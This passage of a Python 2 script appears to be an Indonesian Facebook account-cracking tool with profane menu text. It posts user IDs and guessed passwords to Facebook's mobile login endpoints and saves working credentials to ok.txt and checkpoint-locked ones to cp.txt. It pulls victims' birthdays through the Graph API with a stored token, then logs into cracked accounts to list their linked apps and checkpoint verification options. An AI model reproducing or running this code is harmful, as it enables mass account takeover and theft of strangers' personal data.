            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s|%s' % (uid, pw))
            open('ok.txt', 'a').write('%s|%s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s|%s' % (uid, pw))
                    open('cp.txt', 'a').write('%s|%s|%s\n' % (uid, pw, ttl))
                    open('checkcpoint.txt', 'a').write('%s|%s|%s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass
            print '\r\x1b[1;33m [CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s|%s' % (uid, pw))
            open('cp.txt', 'a').write('%s|%s\n' % (uid, pw))
            open('checkcpoint.txt', 'a').write('%s|%s\n' % (uid, pw))
            break
        else:
            continue
    loop += 1
def mobile(uid, panjihitam):
    global loop
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
    sys.stdout.write('\r [Crack] %s/%s OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in panjihitam:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://touch.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'touch.facebook.com', 'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://touch.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass
        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        panji = ses.post('https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
            kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
            print '\r \x1b[1;32m[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s|%s' % (uid, pw))
            open('ok.txt', 'a').write('%s|%s\n' % (uid, pw))
            break
        elif 'checkpoint' in ses.cookies.get_dict().keys():
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s|%s' % (uid, pw))
                    open('cp.txt', 'a').write('%s|%s|%s\n' % (uid, pw, ttl))
                    open('checkcpoint.txt', 'a').write('%s|%s|%s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass
            print '\r\x1b[1;33m [CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s|%s' % (uid, pw))
            open('cp.txt', 'a').write('%s|%s\n' % (uid, pw))
            open('checkcpoint.txt', 'a').write('%s|%s\n' % (uid, pw))
            break
        else:
            continue
    loop += 1
def hasil():
    if len(ok) != 0 or len(cp) != 0:
        exit(linux.awokawokaowkwoawkwowksheheheiwoansvdejeike_panjihitam_sayang())
    else:
        exit('\n%s [%s\xe2\x80\xa2%s] Lah? Kok Gak Dapat Hasil :v\n%s [%s!%s] Makanya Gans Biar Dapat Result :v' % (p, b, p, p, m, p))
def awokawokaowkwoawkwowksheheheiwoansvdejeike_panjihitam_sayang():
    kotntodhsvsvsvsvsv = raw_input('\n %s[%s\xe2\x80\xa2%s] Check Option Account Sesi? y/n\n%s [%s\xe2\x80\xa2%s] Choose: ' % (p, b, p, p, b, p))
    if kotntodhsvsvsvsvsv in ('y', 'Y'):
        option_sesi()
    elif kotntodhsvsvsvsvsv in ('n', 'N'):
        os.remove('checkcpoint.txt')
        menu()
    else:
        exit('\n%s [%s!%s] Pilihan tidak ada!' % (p, m, p))
def option_sesi():
    files = 'checkcpoint.txt'
    try:
        buka_baju = open(files, 'r').readlines()
    except IOError:
        exit('\n%s [%s!%s] Files %s%s%s Tidak Ada!' % (p, m, p, h, files, p))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid = kontol.split('|')
        print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account : ' + kontol.replace(' + ', '')
        try:
            panjihitam_chann(titid[0].replace(' + ', ''), titid[1])
        except requests.exceptions.ConnectionError:
            pass
    os.remove('checkcpoint.txt')
    exit('\n%s [%s!%s] Done Ya Anjing' % (p, m, p))
def panjihitam_chann(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue
    data.update({'email': user, 'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies={'cookie': kuki}).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {'aria-hidden': 'false'}) ][2:]
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s' % str(len(xe))
        num = 0
        for _ in xe:
            num += 1
            print '  ' + str(num) + ' ' + _[0][0] + ', ' + _[0][1]
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        xnxx = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total Opsi Yang Tersedia  ' + str(len(ngew))
        for opt in range(len(ngew)):
            print ' [\x1b[1;36m' + str(opt + 1) + '\x1b[1;37m] ' + ngew[opt]
    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print '%s[%s!%s] %s' % (p, m, p, oh)
    else:
        print '%s[%s!%s] Error Login Failed!\n' % (p, m, p)
def cek_opsi_sesi():
    files = raw_input('\n %s[%s\xe2\x80\xa2%s] Masukan files yang berisi akun checkpoint\n %s[%s\xe2\x80\xa2%s] Files: ' % (p, b, p, p, b, p))
    try:
        buka_baju = open(files, 'r').readlines()
    except IOError:
        exit('\n%s [%s!%s] Files %s%s%s Tidak Ada!' % (p, m, p, h, files, p))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid = kontol.split('|')
        print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account : ' + kontol.replace(' + ', '')
        try:
            panjicheck(titid[0].replace(' + ', ''), titid[1])
        except requests.exceptions.ConnectionError:
            pass
    os.remove('cp.txt')
    exit('\n%s [%s!%s] Done Ya Anjing' % (p, m, p))
def panjicheck(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue
    data.update({'email': user, 'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies={'cookie': kuki}).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {'aria-hidden': 'false'}) ][2:]
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s' % str(len(xe))
        num = 0
        for _ in xe:
            num += 1
            print '  ' + str(num) + ' ' + _[0][0] + ', ' + _[0][1]
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        xnxx = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total Opsi Yang Tersedia  ' + str(len(ngew))
        for opt in range(len(ngew)):
            print ' [\x1b[1;36m' + str(opt + 1) + '\x1b[1;37m] ' + ngew[opt]
    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print '%s[%s!%s] %s' % (p, m, p, oh)
    else:
        print '%s[%s!%s] Error Login Failed!\n' % (p, m, p)
def results():
    cek_ok = open('ok.txt', 'r').read()
    cek_cp = open('cp.txt', 'r').read()
    print '\n %s[%s1%s] Cek ok hasil crack\n %s[%s2%s] Cek cp hasil crack\n %s[%s0%s] Back to menu' % (p, b, p, p, b, p, p, b, p)
    cek_ress = raw_input('\n%s [%s\xe2\x80\xa2%s] Choose: ' % (p, b, p))
    if cek_ress in ('1', '01'):
        if len(cek_ok) != 0:
            print '\n %s[%s Results ok %s]%s\n' % (b, p, b, p)
            os.system('cat ok.txt')
        else:
            print '\n %s[%s!%s] Results tidak ada!' % (p, m, p)
            os.sys.exit()
    elif cek_ress in ('2', '02'):
        if len(cek_cp) != 0:
            print '\n %s[%s Results cp %s]%s\n' % (b, p, b, p)
            os.system('cat cp.txt')
        else:
            print '\n %s[%s!%s] Results tidak ada!' % (p, m, p)
            os.sys.exit()
    elif cek_ress in ('0', '00'):
        menu()
    else:
        exit('\n%s [%s!%s] Pilihan tidak ada!' % (p, m, p))
def setting():
    print '\n%s [%s1%s] Setting user agent sendiri\n %s[%s2%s] Cek user agent sekarang' % (p, b, p, p, b, p)
    cek_panji = raw_input('\n%s [%s\xe2\x80\xa2%s] Choose: ' % (p, b, p))
    if cek_panji in ('1', '01'):
        user_panji = raw_input('\n%s [%s\xe2\x80\xa2%s] Masukan user agent mu\n %s[%s\xe2\x80\xa2%s] User agent: ' % (p, b, p, p, b, p))
        print '%s [%s\xe2\x80\xa2%s] Please Wait!' % (p, b, p)
        time.sleep(1.5)
        open('ua', 'w').write(user_panji)
        print '%s [%s\xe2\x80\xa2%s] Berhasil set user agent' % (p, b, p)
        raw_input('%s [Back]' % p)
        menu()
    elif cek_panji in ('2', '02'):
        try:
            ua = open('ua', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        print '%s [%s\xe2\x80\xa2%s] User agent sekrng: %s' % (p, b, p, ua)
def cek_folder_ok_cp():
    try:
        open('ok.txt', 'r').read()
    except Exception as e:
        os.system('touch ok.txt')
    try:
        open('cp.txt', 'r').read()
    except Exception as e:
        os.system('touch cp.txt')
if __name__ == '__main__':
    os.system('git pull')
    os.system('touch login.txt')
    cek_folder_ok_cp()
    menu()
# Mau Ngapain Cuk?
